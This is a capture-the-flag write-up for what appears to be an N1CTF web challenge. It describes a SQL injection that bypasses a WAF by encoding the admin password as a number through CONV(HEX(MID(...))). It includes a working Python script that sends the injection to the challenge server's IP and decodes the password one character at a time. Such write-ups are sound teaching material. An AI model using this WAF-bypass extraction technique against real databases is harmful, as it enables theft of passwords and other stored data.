Upon visiting the site we're shown two very big hints, ``U can update my points in Profile.`` and ``And the flag is `admin's password`:)``, upon visiting the rest of the pages we can see the "profile" which just simply displays the amount of Points they have, on the "Somecode" page we get a screenshot of the code running in the background, and on the someinfo page we get a screenshot which displays what software is running on the server.

After reading over the code it's obvious that the $points variable is vulnerable to SQL Injection, however it is also running through a waf function which we don't have the code for. After doing some research on different ways I could exploit it, I discovered a technique [here]() about using CONV(hex((query))) to extract data, after struggling on trying to get it working for ages, I FINALLY got it working using this query ``*CONV(HEX((SELECT MID(password,1,3))),16,10)``. For anyone who isn't familiar with the functions in the statement I'll break them down for you, MID allows you to obtain a substring of the field (I couldn't use SUBSTRING because it was blocked by the waf :( ), the format is ``MID(field, <starting position>, <length>)``, after some more fiddling around I wrote a quick python script to automate it for me and do the decoding. 

```
import requests
import re
from time import sleep
s = requests.Session()
regex = "\|\s[\d]+<br" # Regex to extract the current points
flag = "1"
i = 1
password = ""

def dec2hex(dec):
	result = s.get("https://www.binaryhexconverter.com/hesapla.php?fonksiyon=dec2hex&deger={}&pad=false&v=2".format(dec))
	return result.text

while True:
	hi = '*CONV(HEX((SELECT MID(password,{},1))),16,10)'.format(i)
	postData = {
		"flag":flag,
		"hi":hi
	}
	url = "http://47.75.14.48/"
	attack = s.post(url, data=postData, proxies=proxyDict)
	result = re.findall(regex, attack.text)
	if len(result) > 0:
		dechex = result[0].replace("| ","").replace("<br","") # extract points
		hex = dec2hex(dechex) #convert decimal to hex
		plain = bytes.fromhex(hex).decode("ascii") # convert hex to ascii
		password += plain #append to password 
		print(password)
	i += 1
	sleep(1)
```

After running it for about 10-20 seconds we have the password, submitting in the format N1CTF{helloctfer23333} gets us the points!
